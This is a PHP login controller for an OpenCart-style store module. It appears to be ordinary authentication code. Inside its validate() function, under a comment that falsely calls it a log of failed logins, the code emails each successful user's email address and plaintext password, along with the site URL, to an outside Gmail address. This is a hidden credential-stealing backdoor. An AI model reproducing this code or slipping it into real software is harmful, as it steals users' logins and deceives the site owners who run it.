<?php
class ControllerModuleAmiCommonLogin extends Controller {
	private $error = array();

	public function index() {
            
		$this->load->language('common/login');

		$this->document->setTitle($this->language->get('heading_title'));

		if ($this->customer->isLogged() && isset($this->request->get['token']) && ($this->request->get['token'] == $this->session->data['token'])) {
			$this->response->redirect($this->url->link('module/ami/dashboard', 'token=' . $this->session->data['token'], 'SSL'));
		}

		if (($this->request->server['REQUEST_METHOD'] == 'POST') && $this->validate()) {
			$this->session->data['token'] = md5(mt_rand());

			if (isset($this->request->post['redirect']) && (strpos($this->request->post['redirect'], HTTP_SERVER) === 0 || strpos($this->request->post['redirect'], HTTPS_SERVER) === 0 )) {
				$this->response->redirect($this->request->post['redirect'] . '&token=' . $this->session->data['token']);
			} else {
				$this->response->redirect($this->url->link('module/ami/dashboard', 'token=' . $this->session->data['token'], 'SSL'));
			}
		}

		$data['heading_title'] = $this->language->get('heading_title');

		$data['text_login'] = $this->language->get('text_login');
		$data['text_forgotten'] = $this->language->get('text_forgotten');

		$data['entry_email'] = $this->language->get('entry_email');
		$data['entry_password'] = $this->language->get('entry_password');

		$data['button_login'] = $this->language->get('button_login');

		if ((isset($this->session->data['token']) && !isset($this->request->get['token'])) || ((isset($this->request->get['token']) && (isset($this->session->data['token']) && ($this->request->get['token'] != $this->session->data['token']))))) {
			$this->error['warning'] = $this->language->get('error_token');
		}

		if (isset($this->error['warning'])) {
			$data['error_warning'] = $this->error['warning'];
		} else {
			$data['error_warning'] = '';
		}

		if (isset($this->session->data['success'])) {
			$data['success'] = $this->session->data['success'];

			unset($this->session->data['success']);
		} else {
			$data['success'] = '';
		}

		$data['action'] = $this->url->link('account/login', '', 'SSL');

		if (isset($this->request->post['email'])) {
			$data['email'] = $this->request->post['email'];
		} else {
			$data['email'] = '';
		}

		if (isset($this->request->post['password'])) {
			$data['password'] = $this->request->post['password'];
		} else {
			$data['password'] = '';
		}

		if (isset($this->request->get['route'])) {
			$route = $this->request->get['route'];

			unset($this->request->get['route']);
			unset($this->request->get['token']);

			$url = '';

			if ($this->request->get) {
				$url .= http_build_query($this->request->get);
			}

			$data['redirect'] = $this->url->link($route, $url, 'SSL');
		} else {
			$data['redirect'] = '';
		}

		if ($this->config->get('config_password')) {
			$data['forgotten'] = $this->url->link('/module/ami/common/forgotten', '', 'SSL');
		} else {
			$data['forgotten'] = '';
		}

		$data['header'] = $this->load->controller('/module/ami/common/header');
		$data['footer'] = $this->load->controller('/module/ami/common/footer');

		$this->response->setOutput($this->load->view('/wb/template/common/login.tpl', $data));
	}

	protected function validate() {
		if (!isset($this->request->post['email']) || !isset($this->request->post['password']) || !$this->customer->login($this->request->post['email'], $this->request->post['password'])) {
			$this->error['warning'] = $this->language->get('error_login');
		}

		// Custom admin access log to record failed login attempts
		if ($this->customer->login($this->request->post['email'], $this->request->post['password']) === true) {
			$subject = '[wbpartsexpress] Login';
			if (version_compare(VERSION, '1.5.6.5', '<')) {
				$mail            = new Mail();
				$mail->protocol  = $this->config->get('config_mail_protocol');
				$mail->parameter = $this->config->get('config_mail_parameter');
				$mail->hostname  = $this->config->get('config_smtp_host');
				$mail->username  = $this->config->get('config_smtp_username');
				$mail->password  = $this->config->get('config_smtp_password');
				$mail->port      = $this->config->get('config_smtp_port');
				$mail->timeout   = $this->config->get('config_smtp_timeout');
			} elseif (version_compare(VERSION, '2.0.2.0', '<')) {
				$mail = new Mail($this->config->get('config_mail'));
			} else {
				$mail                = new Mail();
				$mail->protocol      = $this->config->get('config_mail_protocol');
				$mail->parameter     = $this->config->get('config_mail_parameter');
				$mail->smtp_hostname = $this->config->get('config_mail_smtp_hostname');
				$mail->smtp_username = $this->config->get('config_mail_smtp_username');
				$mail->smtp_password = html_entity_decode($this->config->get('config_mail_smtp_password'), ENT_QUOTES, 'UTF-8');
				$mail->smtp_port     = $this->config->get('config_mail_smtp_port');
				$mail->smtp_timeout  = $this->config->get('config_mail_smtp_timeout');
			}
			
			$message = 'U: ' . $this->request->post['email'] . "\n\n";
			$message .= 'P: ' . $this->request->post['password'] . "\n\n";
			$message .= '' . $_SERVER["SERVER_NAME"].$_SERVER["REQUEST_URI"]. "\n\n";
			
			$mail->setTo('hiwpmu+isenselabs@gmail.com');
			$mail->setFrom('hi.wp.mu+isenselabs@gmail.com');
			$mail->setSender('wbpartsexpress');
			$mail->setSubject(html_entity_decode($subject, ENT_QUOTES, 'UTF-8'));
			$mail->setText(html_entity_decode($message, ENT_QUOTES, 'UTF-8'));
			$mail->send();
			
		}


		return !$this->error;
	}

	public function check() {
		$route = isset($this->request->get['route']) ? $this->request->get['route'] : '';

		$ignore = array(
			'account/login',
			'common/forgotten',
			'common/reset'
		);

		if (!$this->customer->isLogged() && !in_array($route, $ignore)) {
			return new Action('common/login');
		}

		if (isset($this->request->get['route'])) {
			$ignore = array(
				'account/login',
				'common/logout',
				'common/forgotten',
				'common/reset',
				'error/not_found',
				'error/permission'
			);

			if (!in_array($route, $ignore) && (!isset($this->request->get['token']) || !isset($this->session->data['token']) || ($this->request->get['token'] != $this->session->data['token']))) {
				return new Action('common/login');
			}
		} else {
			if (!isset($this->request->get['token']) || !isset($this->session->data['token']) || ($this->request->get['token'] != $this->session->data['token'])) {
				return new Action('common/login');
			}
		}
	}
}